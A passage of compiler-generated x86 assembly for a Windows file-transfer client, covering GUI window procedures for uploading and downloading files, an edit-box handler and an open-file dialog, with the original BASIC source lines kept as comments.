end.select.00DF.client:
;
; [2225] END SELECT
case.00DE.0001.client:
end.select.00DE.client:
;
; [2227] RETURN CallWindowProcA (#down_proc, hWnd, msg, wParam, lParam)
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	[%#down_proc.client]			;;; i672a
	call	_CallWindowProcA@20			;;; i619
	jmp	end.func10.client			;;; i258
;
; [2228] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.downProc.client:  ;;; Function end label for Assembly Programmers.
end.func10.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func10.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
free.func10.client:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-72]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-104]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-128]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-100]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-116]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  downProc ()  *****
;  *****
;
; [2230] FUNCTION  upProc (hWnd, msg, wParam, lParam)
.code
;
#ifdef upProc.hWnd
#undef upProc.hWnd
#endif
#define upProc.hWnd ebp+8	; exposes function argument 'hWnd'
;
;
#ifdef upProc.msg
#undef upProc.msg
#endif
#define upProc.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef upProc.wParam
#undef upProc.wParam
#endif
#define upProc.wParam ebp+16	; exposes function argument 'wParam'
;
;
#ifdef upProc.lParam
#undef upProc.lParam
#endif
#define upProc.lParam ebp+20	; exposes function argument 'lParam'
;
align 16
_upProc.client@16:
;  *****
;  *****  FUNCTION  upProc ()  *****
;  *****
func11.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func11.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.404:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.404			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,100			;;; i114a
;
funcBody11.client:
;
; [2231] STATIC STRING text
data section 'globals$statics'
align	4
%11%text.client:	db 4 dup ?
.code
;
; [2232] STRING path,saveas
#ifdef upProc.path
#undef upProc.path
#endif
#define upProc.path ebp-40	; exposes local variable 'path'
;
#ifdef upProc.saveas
#undef upProc.saveas
#endif
#define upProc.saveas ebp-44	; exposes local variable 'saveas'
;
;
; [2233] STRING filename,filter
#ifdef upProc.filename
#undef upProc.filename
#endif
#define upProc.filename ebp-48	; exposes local variable 'filename'
;
#ifdef upProc.filter
#undef upProc.filter
#endif
#define upProc.filter ebp-52	; exposes local variable 'filter'
;
;
; [2235] SELECT CASE msg
	mov	eax,d[ebp+12]			;;; i665
; .select11.00EA = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
;
; [2236] CASE $$WM_COMMAND	:
	mov	eax,273			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00EA.0001.client			;;; i71
;
; [2237] SELECT CASE wParam
	mov	eax,d[ebp+16]			;;; i665
; .select11.00EB = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
;
; [2238] CASE $$UPL_browse :
	mov	eax,514			;;; i659
	mov	ebx,d[ebp-60]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00EB.0001.client			;;; i71
;
; [2239] filename = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2240] filter = "All Files (*.*)\0*.*\0\0"
	mov	eax,addr @_string.04FF.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2241] ShowOpenFileDialog (#winMain, @filename,filter , initDir$, "Upload File")
	mov	eax,d[ebp-52]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk11.0000 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
#ifdef upProc.initDir$
#undef upProc.initDir$
#endif
#define upProc.initDir$ ebp-72	; exposes local variable 'initDir$'
;
	mov	eax,d[ebp-72]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk11.0001 = ebp-80	; internal variable
	mov	d[ebp-80],eax			;;; i670
	mov	eax,addr @_string.0529.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-80]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[%#winMain.client]			;;; i672a
	call	func20.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-48],ecx			;;; i670
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+16]			;;; i871
	call	%____free			;;; i872
	add	esp,20			;;; i633
;
; [2242] IF filename THEN SendMessageA (#edit6, $$WM_SETTEXT, 0, &filename)
	mov	eax,[ebp-48]			;;; i665
	test	eax,eax			;;; i214
	jz	>> else.00EC.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.00EC.client			;;; i218
	mov	eax,d[ebp-48]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[%#edit6.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
else.00EC.client:
end.if.00EC.client:
;
; [2244] CASE $$UPL_go	:
	jmp	end.select.00EB.client			;;; i69
case.00EB.0001.client:
	mov	eax,511			;;; i659
	mov	ebx,d[ebp-60]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00EB.0002.client			;;; i71
;
; [2245] text = NULL$(512)
	sub	esp,64			;;; i487
	mov	d[esp],512
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	mov	ebx,addr %11%text.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2246] SendMessageA (#edit7, $$WM_GETTEXT, 512, &text)
	mov	eax,d[%11%text.client]			;;; i642
	push	eax			;;; i667a
	push	512			;;; i656a
	push	13			;;; i656a
	push	[%#edit7.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2247] port = XLONG(CSIZE$(text))
#ifdef upProc.port
#undef upProc.port
#endif
#define upProc.port ebp-84	; exposes local variable 'port'
;
	sub	esp,64			;;; i487
	sub	esp,64			;;; i487
	mov	eax,[%11%text.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-84],eax			;;; i670
;
; [2248] SendMessageA (#edit6, $$WM_GETTEXT, 512, &text)
	mov	eax,d[%11%text.client]			;;; i642
	push	eax			;;; i667a
	push	512			;;; i656a
	push	13			;;; i656a
	push	[%#edit6.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2249] path = CSIZE$(text)
	sub	esp,64			;;; i487
	mov	eax,[%11%text.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2250] SendMessageA (#edit10, $$WM_GETTEXT, 512, &text)
	mov	eax,d[%11%text.client]			;;; i642
	push	eax			;;; i667a
	push	512			;;; i656a
	push	13			;;; i656a
	push	[%#edit10.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2251] saveas = CSIZE$(text)
	sub	esp,64			;;; i487
	mov	eax,[%11%text.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2252] compress = SendMessageA(#check4, $$BM_GETCHECK, 0, 0)
#ifdef upProc.compress
#undef upProc.compress
#endif
#define upProc.compress ebp-88	; exposes local variable 'compress'
;
	push	0			;;; i656a
	push	0			;;; i656a
	push	240			;;; i656a
	push	[%#check4.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
	mov	d[ebp-88],eax			;;; i670
;
; [2253] encrypt = SendMessageA(#check5, $$BM_GETCHECK, 0, 0)
#ifdef upProc.encrypt
#undef upProc.encrypt
#endif
#define upProc.encrypt ebp-92	; exposes local variable 'encrypt'
;
	push	0			;;; i656a
	push	0			;;; i656a
	push	240			;;; i656a
	push	[%#check5.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
	mov	d[ebp-92],eax			;;; i670
;
; [2254] crc = SendMessageA(#check6, $$BM_GETCHECK, 0, 0)
#ifdef upProc.crc
#undef upProc.crc
#endif
#define upProc.crc ebp-96	; exposes local variable 'crc'
;
	push	0			;;; i656a
	push	0			;;; i656a
	push	240			;;; i656a
	push	[%#check6.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
	mov	d[ebp-96],eax			;;; i670
;
; [2255] 'PRINT port,path,compress,encrypt,crc,saveas
;
; [2257] IFZ path THEN RETURN 0
	mov	eax,[ebp-40]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.400			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00ED.client			;;; i192
A.400:
	mov	eax,0			;;; i659
	jmp	end.func11.client			;;; i258
else.00ED.client:
end.if.00ED.client:
;
; [2258] IFZ saveas THEN
	mov	eax,[ebp-44]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.401			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00EE.client			;;; i192
A.401:
;
; [2259] DecomposePathname (path, pathname$, parent$, @saveas, file$, extent$)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
#ifdef upProc.pathname$
#undef upProc.pathname$
#endif
#define upProc.pathname$ ebp-100	; exposes local variable 'pathname$'
;
	mov	eax,d[ebp-100]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-80],eax			;;; i670
#ifdef upProc.parent$
#undef upProc.parent$
#endif
#define upProc.parent$ ebp-104	; exposes local variable 'parent$'
;
	mov	eax,d[ebp-104]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk11.0002 = ebp-112	; internal variable
	mov	d[ebp-112],eax			;;; i670
#ifdef upProc.file$
#undef upProc.file$
#endif
#define upProc.file$ ebp-116	; exposes local variable 'file$'
;
	mov	eax,d[ebp-116]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk11.0003 = ebp-124	; internal variable
	mov	d[ebp-124],eax			;;; i670
#ifdef upProc.extent$
#undef upProc.extent$
#endif
#define upProc.extent$ ebp-128	; exposes local variable 'extent$'
;
	mov	eax,d[ebp-128]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-124]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	[ebp-112]			;;; i674a
	push	[ebp-80]			;;; i674a
	push	[ebp-68]			;;; i674a
	call	func26.client			;;; i619
	sub	esp,24			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+12]			;;; i877a
	mov	[ebp-44],ecx			;;; i670
	mov	esi,d[esp+16]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+20]			;;; i871
	call	%____free			;;; i872
	add	esp,24			;;; i633
;
; [2260] IF saveas THEN
	mov	eax,[ebp-44]			;;; i665
	test	eax,eax			;;; i214
	jz	>> else.00EF.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.00EF.client			;;; i218
;
; [2261] SendMessageA (#edit10, $$WM_SETTEXT, 0, &saveas)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[%#edit10.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2262] ELSE
	jmp	end.if.00EF.client			;;; i107
else.00EF.client:
;
; [2263] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func11.client			;;; i258
;
; [2264] END IF
end.if.00EF.client:
;
; [2265] END IF
else.00EE.client:
end.if.00EE.client:
;
; [2266] IFZ port THEN port = $$FILE_DEFAULTPORT
	mov	eax,d[ebp-84]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.00F0.client			;;; i195
	mov	eax,28010			;;; i659
	mov	d[ebp-84],eax			;;; i670
else.00F0.client:
end.if.00F0.client:
;
; [2267] flag = 0x0000
#ifdef upProc.flag
#undef upProc.flag
#endif
#define upProc.flag ebp-132	; exposes local variable 'flag'
;
	mov	eax,0			;;; i659
	mov	d[ebp-132],eax			;;; i670
;
; [2268] IF compress THEN flag = flag | $$FILE_COMPRESS
	mov	eax,d[ebp-88]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00F1.client			;;; i221
	mov	eax,d[ebp-132]			;;; i665
	or	eax,4			;;; i763
	mov	d[ebp-132],eax			;;; i670
else.00F1.client:
end.if.00F1.client:
;
; [2269] IF encrypt THEN flag = flag | $$FILE_ENCRYPT
	mov	eax,d[ebp-92]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00F2.client			;;; i221
	mov	eax,d[ebp-132]			;;; i665
	or	eax,2			;;; i763
	mov	d[ebp-132],eax			;;; i670
else.00F2.client:
end.if.00F2.client:
;
; [2270] IF crc THEN flag = flag | $$FILE_CRC
	mov	eax,d[ebp-96]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00F3.client			;;; i221
	mov	eax,d[ebp-132]			;;; i665
	or	eax,1			;;; i763
	mov	d[ebp-132],eax			;;; i670
else.00F3.client:
end.if.00F3.client:
;
; [2271] text = $$FILE_DEFAULTAUTH+","+ #server$+","+STRING$(port)+","+path+","+saveas+",0,0,"+STRING$(flag)
	mov	eax,addr @_string.0198.client			;;; i663
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[%#server$.client]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-68],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-84]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-68]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0519.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-68],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-132]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-68]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %11%text.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2272] IFT #CONNECTED THEN
	mov	eax,d[%#CONNECTED.client]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.00F4.client			;;; i221
;
; [2273] _beginthreadex (NULL, 0, &ClientUpload(), &text, 0, &tid)
#ifdef upProc.NULL
#undef upProc.NULL
#endif
#define upProc.NULL ebp-136	; exposes local variable 'NULL'
;
	mov	eax,addr _ClientUpload.client@4			;;; i599
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[%11%text.client]			;;; i642
	mov	d[ebp-80],eax			;;; i670
#ifdef upProc.tid
#undef upProc.tid
#endif
#define upProc.tid ebp-140	; exposes local variable 'tid'
;
	lea	eax,[ebp-140]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	[ebp-80]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	0			;;; i656a
	push	[ebp-136]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
;
; [2274] Sleep (20)
	push	20			;;; i656a
	call	_Sleep@4			;;; i619
;
; [2275] END IF
else.00F4.client:
end.if.00F4.client:
;
; [2276] END SELECT
case.00EB.0002.client:
end.select.00EB.client:
;
; [2277] END SELECT
case.00EA.0001.client:
end.select.00EA.client:
;
; [2279] RETURN CallWindowProcA (#up_proc, hWnd, msg, wParam, lParam)
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	[%#up_proc.client]			;;; i672a
	call	_CallWindowProcA@20			;;; i619
	jmp	end.func11.client			;;; i258
;
; [2280] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.upProc.client:  ;;; Function end label for Assembly Programmers.
end.func11.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func11.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
free.func11.client:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-72]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-104]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-128]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-100]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-116]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  upProc ()  *****
;  *****
;
; [2282] FUNCTION  EditProc (hWnd, msg, wParam, lParam)
.code
;
#ifdef EditProc.hWnd
#undef EditProc.hWnd
#endif
#define EditProc.hWnd ebp+8	; exposes function argument 'hWnd'
;
;
#ifdef EditProc.msg
#undef EditProc.msg
#endif
#define EditProc.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef EditProc.wParam
#undef EditProc.wParam
#endif
#define EditProc.wParam ebp+16	; exposes function argument 'wParam'
;
;
#ifdef EditProc.lParam
#undef EditProc.lParam
#endif
#define EditProc.lParam ebp+20	; exposes function argument 'lParam'
;
align 16
_EditProc.client@16:
;  *****
;  *****  FUNCTION  EditProc ()  *****
;  *****
funcF.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBodyF.client:
;
; [2285] SELECT CASE msg
	mov	eax,d[ebp+12]			;;; i665
; .selectF.00F5 = ebp-40	; internal variable
	mov	d[ebp-40],eax			;;; i670
;
; [2287] CASE $$WM_KEYDOWN :' WM_KEYDOWN returns virtKey constants
	mov	eax,256			;;; i659
	mov	ebx,d[ebp-40]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00F5.0001.client			;;; i71
;
; [2288] IF wParam == $$VK_RETURN THEN
	mov	eax,d[ebp+16]			;;; i665
	cmp	eax,13			;;; i684a
	jne	>> else.00F6.client			;;; i219
;
; [2289] id = GetWindowLongA (hWnd, $$GWL_ID)
#ifdef EditProc.id
#undef EditProc.id
#endif
#define EditProc.id ebp-44	; exposes local variable 'id'
;
;
; [0] EXTERNAL FUNCTION GetWindowLongA (hwnd, nIndex)
	push	-12			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_GetWindowLongA@8			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2290] wParam = ($$EDITBOX_RETURN << 16) OR id
	mov	eax,402			;;; i659
	shl	eax,16			;;; i835
	mov	ebx,d[ebp-44]			;;; i665
	or	eax,ebx			;;; i763
	mov	d[ebp+16],eax			;;; i670
;
; [2291] SendMessageA (GetParent(hWnd), $$WM_COMMAND, wParam, hWnd)' send WM_COMMAND message to main window callback function
;
; [0] EXTERNAL FUNCTION GetParent (hwnd)
	push	[ebp+8]			;;; i674a
	call	_GetParent@4			;;; i619
; .xstkF.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	[ebp+8]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	273			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [2292] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.funcF.client			;;; i258
;
; [2293] END IF
else.00F6.client:
end.if.00F6.client:
;
; [2295] '		CASE $$WM_CHAR :				' WM_CHAR can capture keyboard characters
;
; [2296] '			charCode = wParam
;
; [2297] '			PRINT "WM_CHAR message: ASCII charCode="; charCode, "CHAR="; CHR$(charCode)	' validate text entry by character
;
; [2298] '			RETURN 0
;
; [2299] END SELECT
case.00F5.0001.client:
end.select.00F5.client:
;
; [2301] RETURN CallWindowProcA (#old_proc, hWnd, msg, wParam, lParam)
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	[%#old_proc.client]			;;; i672a
	call	_CallWindowProcA@20			;;; i619
	jmp	end.funcF.client			;;; i258
;
; [2302] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EditProc.client:  ;;; Function end label for Assembly Programmers.
end.funcF.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  EditProc ()  *****
;  *****
;
; [2304] FUNCTION  ShowOpenFileDialog (hWndOwner, fileName$, filter$, initDir$, title$)
.code
;
#ifdef ShowOpenFileDialog.hWndOwner
#undef ShowOpenFileDialog.hWndOwner
#endif
#define ShowOpenFileDialog.hWndOwner ebp+8	; exposes function argument 'hWndOwner'
;
;
#ifdef ShowOpenFileDialog.fileName$
#undef ShowOpenFileDialog.fileName$
#endif
#define ShowOpenFileDialog.fileName$ ebp+12	; exposes function argument 'fileName$'
;
;
#ifdef ShowOpenFileDialog.filter$
#undef ShowOpenFileDialog.filter$
#endif
#define ShowOpenFileDialog.filter$ ebp+16	; exposes function argument 'filter$'
;
;
#ifdef ShowOpenFileDialog.initDir$
#undef ShowOpenFileDialog.initDir$
#endif
#define ShowOpenFileDialog.initDir$ ebp+20	; exposes function argument 'initDir$'
;
;
#ifdef ShowOpenFileDialog.title$
#undef ShowOpenFileDialog.title$
#endif
#define ShowOpenFileDialog.title$ ebp+24	; exposes function argument 'title$'
;
align 16
_ShowOpenFileDialog.client@20:
;  *****
;  *****  FUNCTION  ShowOpenFileDialog ()  *****
;  *****
func20.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func20.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.412:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.412			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody20.client:
;
; [2305] OPENFILENAME ofn
; .composites = ebp-40	; internal variable
#ifdef ShowOpenFileDialog.ofn
#undef ShowOpenFileDialog.ofn
#endif
#define ShowOpenFileDialog.ofn ebp-44	; exposes local variable 'ofn'
;
;
; [2306] SHARED hInst
;
; [2309] ofn.lStructSize = SIZE(ofn)'set length of struct
	mov	eax,76			;;; i584
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [2310] ofn.hwndOwner 	= hWndOwner'set parent window handle
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp+8]			;;; i665
	mov	d[eax+4],ebx			;;; i13b
;
; [2311] ofn.hInstance 	= hInst'set the application's instance
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[%hInst.client]			;;; i663a
	mov	d[eax+8],ebx			;;; i13b
;
; [2312] ofn.lpstrFilter = &filter$
	mov	eax,d[ebp+16]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+12],eax			;;; i13b
;
; [2314] 'create a buffer for the returned file
;
; [2315] IF fileName$ = "" THEN
	mov	eax,[ebp+12]			;;; i665
	xor	ebx,ebx			;;; i658
	call	%_string.compare.vv			;;; i690
	jne	>> else.00F7.client			;;; i219
;
; [2316] fileName$ = SPACE$(254)
	sub	esp,64			;;; i487
	mov	d[esp],254
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2317] ELSE
	jmp	end.if.00F7.client			;;; i107
else.00F7.client:
;
; [2318] fileName$ = fileName$ + SPACE$(254 - LEN(fileName$))
	sub	esp,64			;;; i487
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.408			;;; i594
